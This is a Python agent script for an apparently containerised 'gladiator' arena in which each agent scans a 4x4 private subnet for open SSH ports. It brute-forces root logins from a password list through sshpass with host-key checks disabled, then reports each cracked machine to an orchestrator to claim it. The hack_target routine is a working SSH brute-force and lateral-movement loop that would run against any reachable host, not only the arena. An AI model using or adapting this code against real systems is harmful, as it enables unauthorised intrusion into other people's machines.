
import os
import sys
import time
import random
import json
import socket
import subprocess
import urllib.request
import urllib.parse

ORCHESTRATOR_URL = "http://arena_orchestrator:5000"
# Hardcoded for now to match Orchestrator's init_grid
ME = os.environ.get("GLADIATOR_ID", "Glad_A")


def remote_log(msg):
    # Local print
    print(f"[{ME}] {msg}")
    sys.stdout.flush()
    # Remote push
    try:
        # We need our ID. For dummy, we'll assume ID=Hostname for now or track it
        # Actually register returns stats but not ID explicitly if we didn't send one?
        # Register assumes we ARE the ID.
        # Let's just use ME as ID.
        post_json(f"{ORCHESTRATOR_URL}/api/log", {"gladiator_id": ME, "message": msg})
    except:
        pass

def log(msg):
    remote_log(msg)



def get_my_ip():
    # Use actual hostname (container ID) to get IP, not the Gladiator ID
    hostname = socket.gethostname()
    return socket.gethostbyname(hostname)

def post_json(url, data=None):
    try:
        if data:
            json_data = json.dumps(data).encode('utf-8')
            req = urllib.request.Request(url, data=json_data, headers={'Content-Type': 'application/json'})
        else:
            req = urllib.request.Request(url, method='POST')
        
        with urllib.request.urlopen(req) as response:
            if response.status == 200:
                return json.loads(response.read().decode())
            return None
    except Exception as e:
        log(f"Request failed to {url}: {e}")
        return None

def register():
    log("Registering with Orchestrator...")
    # Fix: Send actual JSON data, not empty POST which triggers 415
    data = post_json(f"{ORCHESTRATOR_URL}/api/register", {"gladiator_id": ME})
    if data:
        log(f"Registered! Class: {data.get('weight_class')} Delay: {data.get('delay')}s")
        return True
    return False

def get_neighbors():
    my_ip = get_my_ip()
    neighbors = []
    # Scan 4x4 subnet: 172.20.0-3.10-13
    # Just generic scan 4 rows, 4 cols
    for y in range(4):
        for x in range(4):
            target_ip = f"172.20.{y}.{10+x}"
            if target_ip == my_ip:
                continue
            neighbors.append(target_ip)
    return neighbors

def hack_target(target_ip):
    log(f"Checking Port 22 on {target_ip}...")
    # Check if port 22 is open
    res = subprocess.call(["nc", "-z", "-w", "1", target_ip, "22"])
    if res != 0:
        # log(f"Port 22 CLOSED on {target_ip}.")
        return False
        
    log(f"Port 22 Open on {target_ip}. Brute forcing...")
    
    with open("passwords.txt", "r") as f:
        passwords = [line.strip() for line in f]
    
    for pwd in passwords:
        # Increased timeout to 8s (just to be safe)
        # Added UserKnownHostsFile=/dev/null to ensure no sticky host key weirdness
        cmd = f"sshpass -p '{pwd}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 root@{target_ip} 'echo HACKED'"
        try:
            # Popen to capture stdout AND stderr
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            out, err = proc.communicate()
            
            if b"HACKED" in out:
                log(f"PASSWORD CRACKED: {pwd}")
                return True
            else:
                # Log the error for the first password only to avoid spam, or if it's a specific error
                error_msg = err.decode().strip()
                if "refused" in error_msg or "timed out" in error_msg:
                     log(f"SSH Failed for {pwd}: {error_msg}")
                # Optional: log all errors for debugging
                # log(f"SSH Debug ({pwd}): {error_msg}")
                
        except Exception as e:
            log(f"SSH Exception: {e}")
            continue
            
    return False

def claim_room(target_ip):
    log(f"Claiming room {target_ip}...")
    data = post_json(f"{ORCHESTRATOR_URL}/api/claim", {"target_ip": target_ip})
    if data:
        log(f"CLAIM SUCCESS! Moving to {target_ip}...")
        time.sleep(10) # Wait to die/move
    else:
        log(f"Claim failed.")

def main():
    log("Gladiator v0.2 (No Requests) Starting...")
    
    # Create dummy model
    if not os.path.exists("/gladiator/data/model.bin"):
        try:
            with open("/gladiator/data/model.bin", "wb") as f:
                f.write(os.urandom(1024 * 1024)) # 1MB
        except:
            pass
            
    if not register():
        time.sleep(2)
        # retry once
        if not register():
            sys.exit(1)
        
    while True:
        targets = get_neighbors()
        
        # Parse my IP to coords
        my_ip = get_my_ip()
        my_parts = my_ip.split('.')
        my_y = int(my_parts[2])
        my_x = int(my_parts[3]) - 10
        
        # Sort targets by distance
        def get_dist(target_ip):
            parts = target_ip.split('.')
            ty = int(parts[2])
            tx = int(parts[3]) - 10
            return abs(my_x - tx) + abs(my_y - ty)
            
        targets.sort(key=get_dist)
        
        log(f"Scanning... Found {len(targets)} potential targets. Prioritizing neighbors.")
        
        found_victim = False
        for t in targets:
            dist = get_dist(t)
            if dist > 1:
                # Optional: Skip distant targets if we want to be "smart"
                # log(f"Skipping {t} (Dist {dist}) - Too far.")
                # continue
                pass
                
            # log(f"Ping {t}...") # Too noisy to log every ping?
            if hack_target(t):
                claim_room(t)
                found_victim = True
                break 
        
        if not found_victim:
            log("Scan complete. No vulnerable targets found. Sleeping...")
        
        time.sleep(5)

if __name__ == "__main__":
    main()
